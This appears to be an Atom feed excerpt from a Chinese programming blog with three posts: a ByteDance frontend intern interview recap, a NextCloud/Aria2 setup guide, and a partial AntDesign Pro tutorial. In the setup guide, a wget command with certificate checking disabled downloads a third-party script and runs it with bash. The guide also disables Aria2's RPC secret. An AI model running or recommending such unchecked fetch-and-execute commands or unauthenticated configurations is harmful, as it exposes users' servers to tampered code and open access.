    <link href="https://coder.lufer.cc/%E5%89%8D%E7%AB%AF/%E4%BB%8A%E6%97%A5%E5%A4%B4%E6%9D%A1%E5%89%8D%E7%AB%AF%E5%AE%9E%E4%B9%A0%E7%94%9F%E9%9D%A2%E8%AF%95%E4%B8%89%E9%9D%A2%E6%80%BB%E7%BB%93/"/>
    <id>https://coder.lufer.cc/%E5%89%8D%E7%AB%AF/%E4%BB%8A%E6%97%A5%E5%A4%B4%E6%9D%A1%E5%89%8D%E7%AB%AF%E5%AE%9E%E4%B9%A0%E7%94%9F%E9%9D%A2%E8%AF%95%E4%B8%89%E9%9D%A2%E6%80%BB%E7%BB%93/</id>
    <published>2019-05-23T15:59:40.000Z</published>
    <updated>2021-12-17T03:59:35.915Z</updated>
    
    <content type="html"><![CDATA[<h1 id="今日头条前端实习生面试三面总结"><a class="markdownIt-Anchor" href="#今日头条前端实习生面试三面总结"></a> 今日头条前端实习生面试三面总结</h1><h1 id="一面"><a class="markdownIt-Anchor" href="#一面"></a> 一面</h1><p>  一面给了一份题做。</p><h2 id="简述js的继承与原型链"><a class="markdownIt-Anchor" href="#简述js的继承与原型链"></a> 简述JS的继承与原型链</h2><p>  每个引用类型都有_proto_属性，指向了他的构造函数的prototype属性。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">a._proto_=<span class="built_in">Array</span>.prototype;</span><br></pre></td></tr></table></figure><p>  当访问一个对象的某个属性时，如果没找到则会到其_proto_上寻找，如果没有，就在构造函数的prototy的_proto_上寻找，这种层级上查的链式结构叫做原型链。</p><p>  放一张远古原型链图：</p><p><img src="https://pic.lufer.cc/images/2021/03/15/r6msLq.png" alt="" /></p><h2 id="实现一下js的继承"><a class="markdownIt-Anchor" href="#实现一下js的继承"></a> 实现一下JS的继承</h2><p>  JS的继承就是在原型链的基础上。<br />  继承只需改变prototype，指向父类，但是需要修改constructor指向正确的内容。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">childclass.prototype=<span class="keyword">new</span> FatherClass();</span><br><span class="line">childclass.prototype.constructor=ChildClass;</span><br></pre></td></tr></table></figure><h2 id="写一个数组去重"><a class="markdownIt-Anchor" href="#写一个数组去重"></a> 写一个数组去重</h2><p>  我想的是一个比较笨的方法，用一个Object来实现唯一key，从而去重。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uniq</span>(<span class="params">array</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> temp = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;array.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp[array[i]]=array[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> result=[];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> temp)</span><br><span class="line">    &#123;</span><br><span class="line">        result.push(temp[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="css元素垂直居中"><a class="markdownIt-Anchor" href="#css元素垂直居中"></a> CSS元素垂直居中</h2><p>  父元素不定宽高，如何实现子元素的垂直居中。</p><p>  我想到的是。</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>:flex;</span><br><span class="line">    <span class="attribute">justify-content</span>:center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  然后面试官问如果不用flex布局如何实现？</p><p>  我只想到了 <code>transform: translateY(-50%);</code> 这种。</p><p>  然后面试官问了如果用Flex的话会有一个rotation属性，如果使用了会如何影响。</p><p>  这个属性之前也没了解过，所以就按照转向随便编了编。</p><h2 id="进程间的通信方式各自有什么应用场景"><a class="markdownIt-Anchor" href="#进程间的通信方式各自有什么应用场景"></a> 进程间的通信方式，各自有什么应用场景</h2><p>  反正当时是没答上来，现在整理一波答案。</p><p>  常见的通信方式有管道、消息队列、共享存储、信号量、套接字、信号。</p><p>  一、管道(Pipe)：</p><p>  管道，通常指无名管道，是 UNIX 系统IPC最古老的形式。</p><p>  1、匿名管道：</p><p>  它是半双工的（即数据只能在一个方向上流动），具有固定的读端和写端。</p><p>  它只能用于具有亲缘关系的进程之间的通信（也是父子进程或者兄弟进程之间）。</p><p>  在内存中申请一块固定大小的缓冲区用于交换数据，它可以看成是一种特殊的文件，对于它的读写也可以使用普通的read、write 等函数。但是它不是普通的文件，并不属于其他任何文件系统，并且只存在于内存中。</p><p>  单个进程中的管道几乎没有任何用处。所以，通常调用 pipe 的进程接着调用 fork，这样就创建了父进程与子进程之间的 IPC 通道。</p><p>  2、命名管道</p><p>  命名管道与匿名管道的区别是命名管道可以用于没有血缘的进程间通信</p><p>  二、消息队列(Message Queue)</p><p>  在内核中创建一队列，队列中每个元素是一个数据报，不同的进程可以通过句柄去访问这个队列。</p><p>  消息队列提供了⼀个从⼀个进程向另外⼀个进程发送⼀块数据的⽅法。</p><p>  三、信号量(Semaphore)</p><p>  1、概念</p><p>  信号量是一个计数器，可以用来控制多个进程对共享资源的访问。它常作为一种锁机制，防止某进程正在访问共享资源时，其他进程也访问该资源。因此，主要作为进程间以及同一进程内不同线程之间的同步手段。<br />  在内核中创建一个信号量集合（本质是个数组），数组的元素（信号量）都是1，使用P操作进行-1，使用V操作+1。</p><p>  （1） P(sv)：如果sv的值⼤大于零，就给它减1；如果它的值为零，就挂起该进程的执⾏。<br />  （2） V(sv)：如果有其他进程因等待sv而被挂起，就让它恢复运⾏，如果没有进程因等待sv⽽挂起，就给它加1。</p><p>  PV操作用于同一进程，实现互斥。<br />  PV操作用于不同进程，实现同步。</p><p>  2、功能：</p><p>  对临界资源进行保护。</p><p>  四、共享存储(Shared Memory)</p><p>  共享内存就是映射一段能被其他进程所访问的内存，这段共享内存由一个进程创建，但多个进程都可以访问。共享内存是最快的 IPC 方式，它是针对其他进程间通信方式运行效率低而专门设计的。它往往与其他通信机制，如信号两，配合使用，来实现进程间的同步和通信。</p><p>  1、概念：</p><p>  将同一块物理内存一块映射到不同的进程的虚拟地址空间中，实现不同进程间对同一资源的共享。<br />  共享内存可以说是最有用的进程间通信方式，也是最快的IPC形式。</p><p>  2、特点：</p><p>  1)不用从用户态到内核态的频繁切换和拷贝数据，直接从内存中读取就可以。<br />  2)共享内存是临界资源，所以需要操作时必须要保证原子性。使用信号量或者互斥锁都可以。<br />  3)生命周期随内核。</p><p>  五、套接字(Socket)</p><p>  套解口也是一种进程间通信机制，与其他通信机制不同的是，它可用于不同及其间的进程通信。</p><p>  六、信号(Signal)</p><h2 id="实现一个深度克隆"><a class="markdownIt-Anchor" href="#实现一个深度克隆"></a> 实现一个深度克隆</h2><h2 id="react的父子组件兄弟组件之间怎么传值"><a class="markdownIt-Anchor" href="#react的父子组件兄弟组件之间怎么传值"></a> React的父子组件，兄弟组件之间怎么传值</h2><h2 id="讲一下react的生命周期"><a class="markdownIt-Anchor" href="#讲一下react的生命周期"></a> 讲一下React的生命周期</h2><h2 id="如果想中断react组件的更新应该怎么做"><a class="markdownIt-Anchor" href="#如果想中断react组件的更新应该怎么做"></a> 如果想中断React组件的更新，应该怎么做</h2><h2 id="跳格子的算法题"><a class="markdownIt-Anchor" href="#跳格子的算法题"></a> 跳格子的算法题</h2><h2 id="实现一个事件发射器"><a class="markdownIt-Anchor" href="#实现一个事件发射器"></a> 实现一个事件发射器</h2><h1 id="二面"><a class="markdownIt-Anchor" href="#二面"></a> 二面</h1><p>  自我介绍</p><h2 id="反转一颗二叉树"><a class="markdownIt-Anchor" href="#反转一颗二叉树"></a> 反转一颗二叉树</h2><h2 id="es6有什么新特性"><a class="markdownIt-Anchor" href="#es6有什么新特性"></a> ES6有什么新特性</h2><h2 id="export导出的意义是什么"><a class="markdownIt-Anchor" href="#export导出的意义是什么"></a> Export导出的意义是什么</h2><h2 id="webpack有什么用"><a class="markdownIt-Anchor" href="#webpack有什么用"></a> webpack有什么用</h2><h2 id="2019年js有什么新东西"><a class="markdownIt-Anchor" href="#2019年js有什么新东西"></a> 2019年JS有什么新东西</h2><h2 id="从用户输入url到显示页面的过程"><a class="markdownIt-Anchor" href="#从用户输入url到显示页面的过程"></a> 从用户输入URL到显示页面的过程</h2><h2 id="对于转盘抽奖九宫格抽奖跳格子抽奖能否抽象成一个统一的算法"><a class="markdownIt-Anchor" href="#对于转盘抽奖九宫格抽奖跳格子抽奖能否抽象成一个统一的算法"></a> 对于转盘抽奖，九宫格抽奖，跳格子抽奖，能否抽象成一个统一的算法</h2><h2 id="如何实现隔离"><a class="markdownIt-Anchor" href="#如何实现隔离"></a> 如何实现隔离</h2><h2 id="箭头函数有什么优势"><a class="markdownIt-Anchor" href="#箭头函数有什么优势"></a> 箭头函数有什么优势</h2><h2 id="讲一下https的密钥交换过程"><a class="markdownIt-Anchor" href="#讲一下https的密钥交换过程"></a> 讲一下HTTPS的密钥交换过程</h2><h2 id="ca证书是怎么发挥作用的"><a class="markdownIt-Anchor" href="#ca证书是怎么发挥作用的"></a> CA证书是怎么发挥作用的</h2><h2 id="http协议和tcp协议是什么关系"><a class="markdownIt-Anchor" href="#http协议和tcp协议是什么关系"></a> HTTP协议和TCP协议是什么关系</h2><h2 id="tcp的三次握手"><a class="markdownIt-Anchor" href="#tcp的三次握手"></a> TCP的三次握手</h2><h1 id="三面"><a class="markdownIt-Anchor" href="#三面"></a> 三面</h1><p>  自我介绍</p><h2 id="用es5写一个数组去重能不能优化一下性能"><a class="markdownIt-Anchor" href="#用es5写一个数组去重能不能优化一下性能"></a> 用ES5写一个数组去重，能不能优化一下性能</h2><h2 id="客户端怎么验证https发送的是原始内容"><a class="markdownIt-Anchor" href="#客户端怎么验证https发送的是原始内容"></a> 客户端怎么验证HTTPS发送的是原始内容</h2><h2 id="https使用密钥加密内容的原理是什么"><a class="markdownIt-Anchor" href="#https使用密钥加密内容的原理是什么"></a> HTTPS使用密钥加密内容的原理是什么</h2><h2 id="如果我拦截了一个https请求那些内容是不加密的"><a class="markdownIt-Anchor" href="#如果我拦截了一个https请求那些内容是不加密的"></a> 如果我拦截了一个HTTPS请求，那些内容是不加密的</h2><h2 id="如何实现百度这种每次输入后向后端发送请求获取结果"><a class="markdownIt-Anchor" href="#如何实现百度这种每次输入后向后端发送请求获取结果"></a> 如何实现百度这种每次输入后向后端发送请求获取结果</h2><h2 id="如果请求过程中遇到问题导致前一个请求比后一个请求返回的晚怎么办"><a class="markdownIt-Anchor" href="#如果请求过程中遇到问题导致前一个请求比后一个请求返回的晚怎么办"></a> 如果请求过程中遇到问题导致前一个请求比后一个请求返回的晚怎么办</h2><h2 id="讲一下css的position"><a class="markdownIt-Anchor" href="#讲一下css的position"></a> 讲一下CSS的position</h2><h2 id="讲一下你是怎么学习js的有没有系统的看过一本书"><a class="markdownIt-Anchor" href="#讲一下你是怎么学习js的有没有系统的看过一本书"></a> 讲一下你是怎么学习JS的，有没有系统的看过一本书</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;今日头条前端实习生面试三面总结&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#今日头条前端实习生面试三面总结&quot;&gt;&lt;/a&gt; 今日头条前端实习生面试三面总结&lt;/h1&gt;
&lt;h1 id=&quot;一面&quot;&gt;&lt;a class=&quot;markdownIt-Anc</summary>
      
    
    
    
    <category term="前端" scheme="https://coder.lufer.cc/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>NextCloud私有云搭建指南</title>
    <link href="https://coder.lufer.cc/Linux/NextCloud%E7%A7%81%E6%9C%89%E4%BA%91%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/"/>
    <id>https://coder.lufer.cc/Linux/NextCloud%E7%A7%81%E6%9C%89%E4%BA%91%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/</id>
    <published>2019-05-06T16:39:48.000Z</published>
    <updated>2021-12-17T03:59:35.253Z</updated>
    
    <content type="html"><![CDATA[<h1 id="目录"><a class="markdownIt-Anchor" href="#目录"></a> 目录：</h1><ul><li><a href="#%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87">前期准备</a></li><li><a href="#NextCloud%E5%AE%89%E8%A3%85">NextCloud安装</a><ul><li><a href="#NextCloud%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC">NextCloud一键安装脚本</a></li><li><a href="#NextCloud%E5%88%9D%E5%A7%8B%E9%85%8D%E7%BD%AE">NextCloud初始配置</a></li></ul></li><li><a href="#%E7%A6%BB%E7%BA%BF%E4%B8%8B%E8%BD%BD%E5%AE%9E%E7%8E%B0">离线下载实现</a><ul><li><a href="#Aria2%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE">Aria2安装与配置</a></li><li><a href="#%E5%AE%89%E8%A3%85OCDownloader">安装OCDownloader</a></li></ul></li></ul><h1 id="前期准备"><a class="markdownIt-Anchor" href="#前期准备"></a> 前期准备</h1><p>  一个可以直连，网速不错的VPS，建议使用Ubuntu16.04以上。</p><h1 id="nextcloud安装"><a class="markdownIt-Anchor" href="#nextcloud安装"></a> NextCloud安装</h1><h2 id="nextcloud一键安装脚本"><a class="markdownIt-Anchor" href="#nextcloud一键安装脚本"></a> NextCloud一键安装脚本</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update  </span><br><span class="line">sudo apt install snapd  </span><br><span class="line">sudo snap install nextcloud</span><br></pre></td></tr></table></figure><p>  等待安装完成，即可通过IP访问NextCloud。</p><h2 id="nextcloud初始配置"><a class="markdownIt-Anchor" href="#nextcloud初始配置"></a> NextCloud初始配置</h2><p>  第一次登陆网站会提示创建管理员账号密码，设置成功后即完成初步设置。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4zjjP.png" alt="" /></p><h1 id="离线下载实现"><a class="markdownIt-Anchor" href="#离线下载实现"></a> 离线下载实现</h1><h2 id="aria2安装与配置"><a class="markdownIt-Anchor" href="#aria2安装与配置"></a> Aria2安装与配置</h2><h3 id="安装aria2"><a class="markdownIt-Anchor" href="#安装aria2"></a> 安装Aria2</h3><p>  Aria2一键安装脚本。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/aria2.sh &amp;&amp; chmod +x aria2.sh &amp;&amp; bash aria2.sh</span><br></pre></td></tr></table></figure><p>  运行脚本后，你可以安装、升级Aria2。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4zXct.png" alt="" /></p><h3 id="配置aria2"><a class="markdownIt-Anchor" href="#配置aria2"></a> 配置Aria2</h3><p>  为了方便后续使用，需要进行一些配置。</p><blockquote><p>vi /root/.aria2/aria2.conf</p></blockquote><p>  对aria2配置文件进行修改</p><p>  要把rpc-secret注释掉，并修改做种条件</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置的RPC授权令牌, v1.18.4新增功能, 取代 --rpc-user 和 --rpc-passwd 选项</span></span><br><span class="line"><span class="comment">#rpc-secret=</span></span><br><span class="line"><span class="comment"># 设置的RPC访问用户名, 此选项新版已废弃, 建议改用 --rpc-secret 选项</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当种子的分享率达到这个数时, 自动停止做种, 0为一直做种, 默认:1.0</span></span><br><span class="line"><span class="attr">seed-ratio</span>=<span class="number">0.1</span></span><br><span class="line"><span class="attr">seed-time</span>=<span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="安装ocdownloader"><a class="markdownIt-Anchor" href="#安装ocdownloader"></a> 安装OCDownloader</h2><p>  点击右上角-应用</p><p>  搜索ocDownloader-下载并启用</p><p>  随后便可使用ocDownloader进行离线下载</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4zhX6.png" alt="" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;目录&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#目录&quot;&gt;&lt;/a&gt; 目录：&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87&quot;&gt;前期准备&lt;/a&gt;&lt;/li&gt;
&lt;li</summary>
      
    
    
    
    <category term="Linux" scheme="https://coder.lufer.cc/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://coder.lufer.cc/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>AntDesign Pro 快速上手</title>
    <link href="https://coder.lufer.cc/%E5%89%8D%E7%AB%AF/AntDesignPro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/"/>
    <id>https://coder.lufer.cc/%E5%89%8D%E7%AB%AF/AntDesignPro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/</id>
    <published>2019-04-22T05:19:24.000Z</published>
    <updated>2021-04-06T02:17:48.530Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前期准备"><a class="markdownIt-Anchor" href="#前期准备"></a> 前期准备</h2><h3 id="环境配置"><a class="markdownIt-Anchor" href="#环境配置"></a> 环境配置</h3><ol><li>安装Node.js</li><li>Clone项目</li><li>本地NPM INSTALL完成相关组件的自动安装</li></ol><h2 id="新建页面"><a class="markdownIt-Anchor" href="#新建页面"></a> 新建页面</h2><p>  项目组织结构：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── &#x2F;src&#x2F;            # 项目源码目录</span><br><span class="line">| |—— &#x2F;assets        # 图标</span><br><span class="line">| |—— &#x2F;common</span><br><span class="line">|   |—— &#x2F;menu        # 菜单</span><br><span class="line">    |—— &#x2F;router      # 路由</span><br><span class="line">| |—— &#x2F;layouts       # 布局</span><br><span class="line">│ ├── &#x2F;components&#x2F;   # 项目组件</span><br><span class="line">│ ├── &#x2F;routes&#x2F;       # 路由组件（页面维度）</span><br><span class="line">│ ├── &#x2F;models&#x2F;       # 数据模型</span><br><span class="line">│ ├── &#x2F;services&#x2F;     # 数据接口</span><br><span class="line">│ ├── &#x2F;utils&#x2F;        # 工具函数</span><br><span class="line">│ ├── router.js      # 路由权限？</span><br><span class="line">| |—— config.js      # 全局配置</span><br><span class="line">│ ├── index.js       # 入口文件</span><br><span class="line">│ ├── index.less     </span><br><span class="line">│ └── index.ejs</span><br></pre></td></tr></table></figure><h3 id="创建文件"><a class="markdownIt-Anchor" href="#创建文件"></a> 创建文件</h3><p>  与routes文件夹下按照喜好的组织结构建立js文件。</p><p>  本例中建立文件夹Tutorial，并建立demo1.js与demo2.js两个页面。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── &#x2F;src&#x2F;            </span><br><span class="line">│ ├── &#x2F;routes&#x2F;       </span><br><span class="line">    |—— &#x2F;Tutorial    </span><br><span class="line">        |—— &#x2F;demo1.js</span><br><span class="line">        |—— &#x2F;demo2.js</span><br></pre></td></tr></table></figure><h3 id="设定菜单"><a class="markdownIt-Anchor" href="#设定菜单"></a> 设定菜单</h3><p>  在common/menu下，托管了项目所有的左边栏菜单。</p><p>  菜单以Json数组形式存在，如下是一个完整的菜单项。</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    name: &#x27;dashboard&#x27;,          #菜单名</span><br><span class="line">    icon: &#x27;dashboard&#x27;,          #菜单图标</span><br><span class="line">    path: &#x27;dashboard&#x27;,          #菜单路径</span><br><span class="line">    authority: &#x27;admin&#x27;,         #权限控制    </span><br><span class="line">    children: [                 #子菜单</span><br><span class="line">      &#123;                            </span><br><span class="line">        name: &#x27;分析页&#x27;,         </span><br><span class="line">        path: &#x27;analysis&#x27;,</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>  我们在其中添加一个菜单项。</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    name: &#x27;AntD-Tutorial&#x27;,      </span><br><span class="line">    icon: &#x27;dashboard&#x27;,         </span><br><span class="line">    path: &#x27;tutorial&#x27;,   </span><br><span class="line">    children: [                </span><br><span class="line">      &#123;                            </span><br><span class="line">        name: &#x27;演示页面1&#x27;,         </span><br><span class="line">        path: &#x27;demo1&#x27;,</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;                            </span><br><span class="line">        name: &#x27;演示页面2&#x27;,         </span><br><span class="line">        path: &#x27;demo2&#x27;,</span><br><span class="line">      &#125;,</span><br><span class="line">    ],       </span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="关联菜单与页面"><a class="markdownIt-Anchor" href="#关联菜单与页面"></a> 关联菜单与页面</h3><p>  在菜单页中，我们将两个子菜单分别指向了：<br />  <code>/tutorial/demo1</code><br />  <code>/tutorial/demo2</code></p><p>  接下来需要接管该路径，指向对应的js文件。</p><p>  修改<code>/common/router.js</code>。</p><p>  在routerConfig项中添加如下所示路径，即可绑定地址与页面。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;/tutorial/demo1&#x27;</span>: &#123;</span><br><span class="line">    component: dynamicWrapper(app, [], <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../routes/Tutorial/demo1&#x27;</span>)),</span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">&#x27;/tutorial/demo2&#x27;</span>: &#123;</span><br><span class="line">    component: dynamicWrapper(app, [], <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../routes/Tutorial/demo2&#x27;</span>)),</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="页面1-原生开发"><a class="markdownIt-Anchor" href="#页面1-原生开发"></a> 页面1-原生开发</h2><p>  在demo1，我们将介绍AntDesign架构的原生开发方式，也借此来理解AntDesign的页面生命周期与数据驱动流程。</p><p>  我们建立一个十分简单的空白页面demo1，并逐步丰富内容来实现最终功能</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component, Fragment &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">demo1</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">componentDidMount</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;Fragment&gt;</span><br><span class="line"></span><br><span class="line">      &lt;/Fragment&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  AntDesign提供了十分丰富的标准页面，例如表单页，列表页，详情页等，我们这里手动实现一次列表页。</p><p>  既然是数据驱动，所以我们从数据开始，像页面倒推实现过程。</p><h3 id="向后端发起请求"><a class="markdownIt-Anchor" href="#向后端发起请求"></a> 向后端发起请求</h3><p>  所有向后端发起的请求，均托管于<code>servvices/api.js</code>中。</p><p>  我们在其中实现一个请求函数。</p><p>  这里强调一下，既然是前后端分离开发，所以各部分人员可以各司其职，并不需要相互制约，只要制定了前后端的数据格式，并且双方均遵守，即可各自分离开发，在最后阶段进行联调即可。</p><p>  为了实现分离开发，前端可以在自行开发阶段对请求自动进行返回。</p><p>  此时我们实现如下所示的一个请求函数：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">GetDataFromBackStage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> request(<span class="string">&#x27;/api/fake_get_data&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  此处可见，我们向api/fake_get_data发起了一个请求。</p><p>  前端提供了一个mock工具，RoadHog，用于拦截请求，返回数据，从而让前端开发不再依赖于后端。</p><p>  我们在.roadhogrc.mock.js中对该请求进行一个拦截并模拟了一组返回值。</p><p>  其语法是<code>请求方式 请求路径:&#123;返回值&#125;</code>。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;GET /api/fake_get_data&#x27;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;pagination&quot;</span>:</span><br><span class="line">      &#123; <span class="string">&quot;total&quot;</span>: <span class="number">1</span>, <span class="string">&quot;current&quot;</span>: <span class="number">1</span>, <span class="string">&quot;pageSize&quot;</span>: <span class="number">10</span> &#125;,</span><br><span class="line">    <span class="string">&quot;list&quot;</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;dataid&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;time&quot;</span>: <span class="string">&quot;2018-10-25T12:29:25.000+0000&quot;</span>,</span><br><span class="line">        <span class="string">&quot;datasourcetype&quot;</span>: <span class="string">&quot;kafka&quot;</span>,</span><br><span class="line">        <span class="string">&quot;status&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;测试用-北京出租车GPS数据&quot;</span>,</span><br><span class="line">        <span class="string">&quot;datatype&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;crossprovince&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;datalocation&quot;</span>: <span class="string">&quot;北京市&quot;</span>,</span><br><span class="line">        <span class="string">&quot;datafield&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;company&quot;</span>: <span class="string">&quot;Didicompany&quot;</span>,</span><br><span class="line">        <span class="string">&quot;datadescription&quot;</span>: <span class="string">&quot;测试用-北京出租车GPS数据&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ownnode&quot;</span>: <span class="number">5</span>,</span><br><span class="line">        <span class="string">&quot;datadefinition&quot;</span>: <span class="string">&quot;字段名:StrCompanyID,数据类型:string,字段说明:StrCompanyID;字段名:StrDepLongitude,数据类型:double,字段说明:StrDepLongitude;字段名:StrDepLatitude,数据类型:double,字段说明:StrDepLatitude;字段名:StrOrderID,数据类型:string,字段说明:StrOrderID;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;url&quot;</span>: <span class="string">&quot;/user/download?file=f6bbfb6e512531cb78a086b94708f398.166ab336727&amp;name=order_true.json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;resourceip&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;kafkatopic&quot;</span>: <span class="string">&quot;ORDER&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataurl&quot;</span>: <span class="string">&quot;127.0.0.1:8000&quot;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;dataid&quot;</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="string">&quot;time&quot;</span>: <span class="string">&quot;2018-10-25T12:39:55.000+0000&quot;</span>,</span><br><span class="line">        <span class="string">&quot;datasourcetype&quot;</span>: <span class="string">&quot;kafka&quot;</span>,</span><br><span class="line">        <span class="string">&quot;status&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;北京出租车GPS数据&quot;</span>,</span><br><span class="line">        <span class="string">&quot;datatype&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;crossprovince&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;datalocation&quot;</span>: <span class="string">&quot;北京市&quot;</span>,</span><br><span class="line">        <span class="string">&quot;datafield&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;company&quot;</span>: <span class="string">&quot;Didicompany&quot;</span>,</span><br><span class="line">        <span class="string">&quot;datadescription&quot;</span>: <span class="string">&quot;北京出租车GPS数据&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ownnode&quot;</span>: <span class="number">6</span>,</span><br><span class="line">        <span class="string">&quot;datadefinition&quot;</span>: <span class="string">&quot;字段名:StrCompanyID;字段名:StrDepLongitude;字段名:StrDepLatitude;字段名:StrOrderID;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;url&quot;</span>: <span class="string">&quot;/user/download?file=f6bbfb6e512531cb78a086b94708f398.166ab3d0424&amp;name=order_true.json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;resourceip&quot;</span>: <span class="string">&quot;192.168.3.19&quot;</span>,</span><br><span class="line">        <span class="string">&quot;kafkatopic&quot;</span>: <span class="string">&quot;ORDER&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataurl&quot;</span>: <span class="string">&quot;192.168.3.19:8000&quot;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>  这样在api中发送请求时，roadhog就可以先将请求拦截下，从而方便前端开发，而在进行联调时，仅需更改api中的请求函数，即可与后端进行测试，例如可改成如下代码段。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">DataSearch</span>(<span class="params">params</span>) 